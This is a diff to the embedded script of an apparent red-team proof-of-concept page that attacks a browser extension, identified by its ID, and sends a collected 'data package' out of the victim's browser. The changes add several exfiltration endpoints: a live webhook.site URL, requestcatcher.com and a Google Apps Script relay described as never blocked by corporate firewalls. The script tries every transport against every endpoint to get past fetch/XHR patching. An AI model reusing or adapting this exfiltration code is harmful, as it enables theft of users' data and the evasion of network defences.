@@ -128,14 +128,17 @@ body{background:#0c0c14;color:#c8c8d8;font-family:-apple-system,BlinkMacSystemFo
 
 <script>
 // ============================================================================
-// CONFIGURATION
+// CONFIGURATION — set at least ONE endpoint for exfiltration
 // ============================================================================
-// PRIMARY: webhook.site endpoint (may be blocked by corporate firewalls)
+// OPTION 1: webhook.site (easy, but often blocked by corporate firewalls)
 const EXFIL_ENDPOINT = "https://webhook.site/2604da4a-b021-4a7b-9126-acfa06d63aaa";
 
-// SECONDARY: Google Apps Script endpoint (script.google.com — never blocked)
+// OPTION 2: requestcatcher.com (no login — open YOUR_NAME.requestcatcher.com to watch)
+const EXFIL_REQCATCH = "";  // e.g. "https://s1-redteam.requestcatcher.com/exfil"
+
+// OPTION 3: Google Apps Script (script.google.com — NEVER blocked by corporate firewalls)
 // Deploy your own: see SETUP_GOOGLE_EXFIL.md instructions
-const EXFIL_GOOGLE = "";  // <-- paste your Google Apps Script web app URL here
+const EXFIL_GOOGLE = "";  // e.g. "https://script.google.com/macros/s/AKfycbx.../exec"
 
 // Extension ID
 const EXT = "iidnankcocecmgpcafggbgbmkbcldmno";
@@ -253,14 +256,14 @@ function downloadData() {
 // EXFILTRATION — sends full data package to webhook
 // ============================================================================
 async function exfiltrate(data) {
-  if (!EXFIL_ENDPOINT) return false;
   const payload = JSON.stringify(data);
 
   // The extension's script.bundle.js monkey-patches window.fetch and XHR.
   // Corporate firewalls may also block known webhook domains.
   // We try EVERY method against EVERY endpoint for maximum reliability.
 
-  const endpoints = [EXFIL_ENDPOINT, EXFIL_GOOGLE].filter(u => u && u.length > 5);
+  const endpoints = [EXFIL_ENDPOINT, EXFIL_REQCATCH, EXFIL_GOOGLE].filter(u => u && u.length > 5);
+  if (!endpoints.length) return false;
   let succeeded = false;
 
   for (const endpoint of endpoints) {
@@ -780,10 +783,11 @@ async function runChain() {
   html += '</div>';
 
   // Beacon status
-  if (EXFIL_ENDPOINT) {
+  const activeEndpoints = [EXFIL_ENDPOINT, EXFIL_REQCATCH, EXFIL_GOOGLE].filter(u => u && u.length > 5);
+  if (activeEndpoints.length) {
     html += '<div class="beacon-status ' + (exfilResult ? 'beacon-ok' : 'beacon-fail') + '">';
     html += exfilResult
-      ? 'Data package exfiltrated to attacker server (' + EXFIL_ENDPOINT.replace(/https?:\/\//, '').slice(0, 40) + '...)'
+      ? 'Data package exfiltrated to ' + activeEndpoints.length + ' attacker endpoint(s) (' + activeEndpoints[0].replace(/https?:\/\//, '').slice(0, 40) + '...)'
       : 'Exfiltration beacon failed — data displayed below instead';
     html += '</div>';
   }
